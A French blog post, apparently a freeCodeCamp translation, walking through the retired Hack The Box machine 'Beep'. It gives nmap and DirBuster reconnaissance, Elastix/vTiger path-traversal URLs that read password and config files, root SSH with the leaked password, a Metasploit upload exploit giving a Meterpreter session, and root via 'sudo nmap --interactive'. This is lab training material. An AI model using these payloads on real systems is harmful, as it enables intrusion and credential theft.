---
title: Restez calme et piratez The Box - Beep
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-09-03T19:57:43.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-beep
coverImage: https://www.freecodecamp.org/news/content/images/2019/09/126406-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: Restez calme et piratez The Box - Beep
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) est une plateforme en ligne vous permettant de tester vos compétences en tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note**. _Seuls les write-ups de machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-19.49.24.png)

**Beep** est décrit comme ayant une très longue liste de services en cours d'exécution, ce qui peut rendre un peu difficile la recherche de la méthode d'entrée correcte. La machine peut être un peu écrasante pour certains car il y a de nombreux vecteurs d'attaque potentiels.

Nous utiliserons les outils suivants pour pirater la box sur une [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [dirbuster](https://tools.kali.org/web-applications/dirbuster)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## **Étape 1 - Scanner le réseau**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir le plus d'informations possible.

J'utiliserai **Nmap** (Network Mapper), qui est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.16.21.png)

J'utilise la commande suivante pour avoir une idée de base de ce que nous scannons

```bash
nmap -sV -O -F --version-light 10.10.10.7
```

**-sV:** Sonde les ports ouverts pour déterminer les informations de service/version

**-O:** Active la détection du système d'exploitation

**-F:** Mode rapide - Scanne moins de ports que le scan par défaut

**--version-light:** Limite aux sondes les plus probables (intensité 2)

**10.10.10.7:** Adresse IP de la box Beep

Vous pouvez également utiliser **Zenmap**, qui est l'interface graphique officielle de Nmap Security Scanner. C'est une application multiplateforme, gratuite et open source qui vise à rendre Nmap facile à utiliser pour les débutants tout en fournissant des fonctionnalités avancées pour les utilisateurs expérimentés de Nmap.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.31.06.png)

J'utilise un ensemble différent de commandes pour effectuer un scan intensif

```bash
nmap -A -v 10.10.10.7
```

**-A:** Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v:** Augmente le niveau de verbosité

**10.10.10.7:** Adresse IP de la box Beep

Si vous trouvez les résultats un peu trop écrasants, vous pouvez passer à l'onglet **Ports/Hôtes** pour obtenir uniquement les ports ouverts.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.34.28.png)

Nous pouvons voir qu'il y a 12 ports ouverts:

**Port** 22. Secure Shell (SSH), connexions sécurisées, transferts de fichiers (scp, sftp) et redirection de port

**Port** 25. Simple Mail Transfer Protocol (SMTP) utilisé pour le routage des emails entre les serveurs de messagerie

**Port** 80. Hypertext Transfer Protocol (HTTP). Ici, c'est un Apache httpd 2.2.3

**Port** 110. Post Office Protocol, version 3 (POP3)

**Port** 111. Open Network Computing Remote Procedure Call (**ONC RPC**, parfois appelé **Sun RPC**)

**Port** 143. Internet Message Access Protocol (IMAP), gestion des messages électroniques sur un serveur

**Port** 443. Hypertext Transfer Protocol sur TLS/SSL (HTTPS)

**Port** 993. Internet Message Access Protocol sur TLS/SSL (IMAPS)

**Port** 995. Post Office Protocol 3 sur TLS/SSL (POP3S)

**Port** 3306. Système de base de données MySQL

**Port** 4445. Proxy HTTP/S I2P

**Port** 10000. Webmin, outil d'administration système Unix/Linux basé sur le Web (port par défaut)

Nmap trouve une liste assez longue de services. Pour l'instant, Apache, qui s'exécute sur les ports 80 et 443, sera la cible principale.

## **Étape 2 - Énumérer les répertoires**

Toujours dans la phase de scanning et de reconnaissance, j'utilise maintenant **DirBuster**. DirBuster est une application Java multithread conçue pour forcer brutalement les noms de répertoires et de fichiers sur les serveurs web/applications.

Vous pouvez lancer DirBuster en tapant cette commande sur le terminal

```bash
dirbuster
```

ou en recherchant l'application

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.01.31-1.png)

L'application ressemble à ceci, où vous pouvez spécifier l'URL cible. Dans notre cas, ce sera **https://10.10.10.7**. Vous pouvez sélectionner un fichier avec la liste des répertoires/fichiers en cliquant sur le bouton Parcourir

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.08.31.png)

J'utilise le fichier **directory-list-2.3-medium.txt** pour cette recherche

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.35.45.png)

DirBuster trouve une énorme liste de répertoires avec plusieurs systèmes de gestion de contenu et applications open source. Il y a plusieurs vulnérabilités qui peuvent conduire à un shell parmi les résultats.

## **Étape 3 - Visiter le site web**

Essayons le port 80 et visitons http://10.10.10.7

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.42.59.png)

Le site web est redirigé vers https://10.10.10.7 et nous devons ajouter une **exception de sécurité** au site web pour continuer

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.44.18.png)

Nous atterrissons enfin sur le site web qui est un **Portail de Connexion Elastix**. Elastix est un logiciel serveur de communications unifiées qui rassemble IP PBX, email, messagerie instantanée, fax et fonctionnalités de collaboration. Il dispose d'une interface Web et inclut des capacités telles qu'un logiciel de centre d'appels avec composition prédictive

Un **IP PBX** ("Internet Protocol private branch exchange") est un système qui connecte les extensions téléphoniques au réseau téléphonique public commuté (RTPC) et fournit une communication interne pour une entreprise

Si vous souhaitez en savoir plus sur Elastix, vous pouvez consulter [ici](https://www.elastix.org/)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.48.13.png)

J'essaie les identifiants par défaut, mais cela ne semble pas fonctionner

```bash
Nom d'utilisateur: admin
Mot de passe: palosanto
```

Regarder le code source n'aide pas non plus

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.19.09.png)

Je vais utiliser **Searchsploit** pour vérifier s'il y a une vulnérabilité connue sur Elastix. Searchsploit est un outil de recherche en ligne de commande pour la **base de données Exploit**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.42.23.png)

J'utilise la commande suivante

```bash
searchsploit elastix
```

Nous pouvons voir plusieurs vulnérabilités, mais nous allons examiner l'**'graph.php' Local File Inclusion** avec cette commande

```bash
searchsploit -x 37637.pl
```

Nous avons un résumé de l'exploit et le code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.44.25.png)

L'**exploit LFI** est le suivant

```url
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Un attaquant peut utiliser **Local File Inclusion (LFI)** pour tromper l'application web afin d'exposer ou d'exécuter des fichiers sur le serveur web. Une attaque LFI peut conduire à la divulgation d'informations, à l'exécution de code à distance, ou même à du Cross-site Scripting (XSS)

Vous pouvez également consulter la **base de données Exploit** pour trouver l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.55.43.png)
_[https://www.exploit-db.com/search?q=elastix](https://www.exploit-db.com/search?q=elastix)_

Vous obtiendrez les mêmes résultats que sur le terminal. Si vous naviguez vers **2.0 - 'graph.php' Local File Inclusion**, vous aurez une description de l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.29.43.png)
_[https://www.exploit-db.com/exploits/37637](https://www.exploit-db.com/exploits/37637)_

Si vous vous souvenez de l'**étape 2**, l'énumération des répertoires a signalé un **vTiger CRM**.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.30.28.png)

vTiger CRM est une application de gestion de la relation client (CRM) intégrée qui peut être utilisée sur l'Intranet ou depuis Internet en utilisant un navigateur. Il est distribué sous une licence gratuite

Si vous souhaitez en savoir plus sur vTiger CRM, vous pouvez consulter [[ici](https://www.vtiger.com/)

Vous pouvez également lire plus sur l'intégration entre Elastix et vTigerCRM [ici](https://crmtiger.com/vtiger-elastix-integration.html)

## **Étape 4 - Essayer l'exploit LFI d'Elastix**

Naviguons vers

```url
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.01.36.png)
_https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&amp;module=Accounts&amp;action_

Si vous ne pouvez rien lire, vous pouvez embellir le fichier en vérifiant le fichier source

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.07.17.png)
_view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&amp;module=Accounts&amp;action_

Je trouve un mot de passe **jEhdIekWmdjE**

Si vous vous souvenez de l'**étape 1**, le scan nmap a signalé le **port 22** comme ouvert, essayons le mot de passe nouvellement trouvé dessus

## **Étape 5 - Connexion à SSH**

Connectons-nous à SSH avec la commande suivante

```bash
ssh root@10.10.10.7
```

J'essaie le mot de passe et je suis connecté!

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.13.18.png)

## Étape 6 - Recherche du flag root.txt

Je peux maintenant chercher le premier flag, **root.txt**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.17.19.png)

J'utilise la commande suivante pour vérifier qui je suis sur cette machine

```bash
whoami
```

J'ai un accès root à la machine. J'ai le pouvoir!

J'utilise la commande suivante pour vérifier où je suis sur la machine

```bash
pwd
```

Je suis dans /root et en faisant

```bash
ls
```

Je trouve le fichier root.txt! Pour lire le contenu du fichier, j'utilise la commande

```bash
cat root.txt
```

Maintenant que nous avons le flag root, cherchons le flag utilisateur!

## Étape 7 - Recherche du flag user.txt

Je dois revenir au répertoire home en faisant

```bash
cd home
```

Je liste ensuite tous les fichiers/dossiers et vois qu'il y a un dossier appelé **fanis**

Je navigue vers ce dossier avec

```bash
cd fanis
```

Et lorsque je liste les fichiers/dossiers, je peux voir le fichier **user.txt**!

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.21.05.png)

Pour lire le contenu du fichier, j'utilise la commande

```bash
cat user.txt
```

Félicitations! Vous avez trouvé les deux flags!

---

> Variations pour les découvertes d'informations

## **Étape 3b - Visiter le site web**

Naviguons vers

```url
https://10.10.10.7/vtigercrm/
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.32.52.png)
_https://10.10.10.7/vtigercrm/_

Nous pouvons voir la version de l'application: **vTiger CRM 5.1.0**

Je vais utiliser Searchsploit pour vérifier s'il y a une vulnérabilité connue sur vTigerCRM

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.35.42.png)

J'utilise la commande suivante

```bash
searchsploit vtiger
```

Nous pouvons voir plusieurs vulnérabilités. J'examine l'inclusion de fichier local avec cette commande

```bash
searchsploit -x 18770.txt
```

J'ai un résumé de l'exploit et le code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.38.12.png)

L'exploit LFI est le suivant

```bash
/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

Vous pouvez également consulter la base de données d'exploits pour trouver l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.42.56.png)

Vous obtiendrez les mêmes résultats sur le terminal. Si vous naviguez vers **vTiger 5.1.0 - Local File Inclusion**, vous aurez une description de l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.43.11.png)

## **Étape 4b - Faire plus de reconnaissance autour des identifiants par défaut de vTiger Asterisk**

Naviguons vers

```url
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```



![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.40.38.png)
_https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00_

Si vous ne pouvez rien lire, vous pouvez embellir le fichier en vérifiant le fichier source

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.41.34.png)
_view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00_

Je fais également des recherches sur les **identifiants par défaut** pour vTiger et trouve une documentation sur l'installation du **connecteur vTiger Asterisk**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-01-at-20.44.49.png)
_[https://www.vtiger.com/docs/asterisk-integration](https://www.vtiger.com/docs/asterisk-integration)_

Si nous modifions l'URL précédente en

```url
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00
```

Je navigue vers cette page (en utilisant le code source pour embellir la sortie)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.55.05.png)
_https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00_

Je trouve un mot de passe **jEhdIekWmdjE**

Vous pouvez continuer à l'**étape 5** à partir de là

---

> Variations utilisant Metasploit, meterpreter, nmap --interactive et Burp

## **Étape 3c - Visiter le site web**

Nous savons que la version de l'application est **vTiger CRM 5.1.0**

Nous allons utiliser **Metasploit**, qui est un framework de test de pénétration qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

Je lance **Metasploit Framework** sur Kali et cherche la commande que je devrais utiliser pour lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-01.09.39.png)

Je trouve une charge utile intéressante, numéro 3

```bash
exploit/multi/http/vtiger_soap_upload
```

Voici la description de l'exploit

> vTiger CRM permet à un utilisateur de contourner l'authentification lors de la demande de services SOAP. De plus, le téléchargement arbitraire de fichiers est possible via le service SOAP AddEmailAttachment. En combinant les deux vulnérabilités, un attaquant peut télécharger et exécuter du code PHP. Ce module a été testé avec succès sur vTiger CRM v5.4.0 sur Ubuntu 10.04 et Windows 2003 SP2.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-01.12.00.png)
_[https://www.exploit-db.com/exploits/30787](https://www.exploit-db.com/exploits/30787)_

J'utilise la commande suivante pour l'exploit

```bash
use exploit/multi/http/vtiger_soap_upload
```

Je dois configurer plusieurs options avant de lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-10.04.01.png)

Je commence par configurer les **RHOSTS** avec la commande suivante

```bash
set RHOSTS 10.10.10.7/32
```

Je configure le **SSL** et le **RPORT** avec

```bash
set SSL true
```

et

```bash
set RPORT 443
```

Je lance l'exploit, mais je dois configurer le **LPORT** correct cette fois avec

```bash
set LPORT 10.10.14.10
```

Voici un résumé de toutes les commandes

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.24.34.png)

Je vérifie les options

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.26.36.png)

Je lance l'exploit avec la commande

```bash
run
```

J'obtiens ce message d'erreur

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.28.54.png)

Je configure le proxy avec la commande suivante

```bash
set proxies http:127.0.0.1:8080
```

Je vérifie les options à nouveau

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.29.34.png)

Je lance l'exploit mais j'obtiens un nouveau message d'erreur

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.31.44.png)

Je le configure avec cette commande

```bash
set ReverseAllowProxy true
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.54.57.png)

Je dois également configurer **Burp** pour proxy l'exploit.

**Burp Suite** est un framework de test de pénétration Web basé sur Java. Il est devenu une suite d'outils standard de l'industrie utilisée par les professionnels de la sécurité de l'information. Burp Suite aide à identifier les vulnérabilités et à vérifier les vecteurs d'attaque qui affectent les applications Web

Vous pouvez en savoir plus sur le site officiel [ici](https://portswigger.net/burp)

Ouvrez Burp et définissez la cible sur le site web dans Target > Scope > Target Scope > Include in scope > edit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.33.40.png)

Je lance l'exploit sur **Metasploit** et retourne à **Burp**. Je peux voir que Burp a intercepté la requête

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.35.29.png)

Je définis l'option Intercept sur **off**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.36.49.png)

De retour sur **Metasploit**, j'obtiens enfin une session **Meterpreter**

D'après le site [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/), nous obtenons cette définition pour Meterpreter

> Meterpreter est une charge utile avancée, dynamiquement extensible qui utilise des stagers d'injection de DLL _en mémoire_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket du stager et fournit une API Ruby complète côté client. Il dispose de l'historique des commandes, de la complétion par tabulation, des canaux, et plus encore.

Vous pouvez lire plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.54.30.png)

## Étape 4c - Recherche du flag user.txt

Je navigue vers le répertoire **root** pour trouver le dossier home. Je me déplace ensuite vers le répertoire home avec

```bash
cd home
```

Vous pouvez lister les fichiers/dossiers avec

```bash
ls -la
```

Je trouve un dossier appelé **fanis**. Voyons ce qu'il y a à l'intérieur avec

```bash
cd fanis
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.58.43.png)

Je liste tous les fichiers/dossiers et je trouve le flag **user.txt**. Pour lire le contenu du fichier, j'utilise la commande

```bash
cat user.txt
```

Maintenant que nous avons le flag utilisateur, cherchons le flag root!

## Étape 5c - Recherche du flag root.txt

Je ne peux pas accéder au dossier root, mais je peux créer un **shell** avec la commande

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.04.32.png)

Si je vérifie qui je suis sur la machine, j'obtiens

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.05.40.png)

Si vous faites

```bash
sudo -l
```

vous pouvez voir de nombreuses commandes **NOPASSWD** qui peuvent nous conduire à obtenir root

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.11.44.png)

Les anciennes versions de Nmap (2.02 à 5.21) avaient un mode interactif qui permettait aux utilisateurs d'exécuter des commandes shell. Puisque Nmap est dans la liste des binaires qui est exécuté avec les privilèges root, il est possible d'utiliser la console interactive afin d'exécuter un shell avec les mêmes privilèges

Essayons avec la commande suivante

```bash
sudo nmap --interactive
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.14.50.png)

La commande suivante donnera un shell élevé. Vous pouvez lire plus sur le shell Bourne [ici](https://en.wikipedia.org/wiki/Bourne_shell)

```bash
!sh
```

Je vérifie qui je suis sur la machine, et j'ai un accès **root**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.17.23.png)

Je peux maintenant naviguer vers le répertoire root

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.22.36.png)

Je trouve le fichier **root.txt.txt**!

Pour lire le contenu du fichier, j'utilise la commande

```bash
cat root.txt
```

Félicitations! Vous avez trouvé les deux flags!

---

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Autres articles Hack The Box**

* [Restez calme et piratez The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Restez calme et piratez The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et piratez The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/126406.jpg)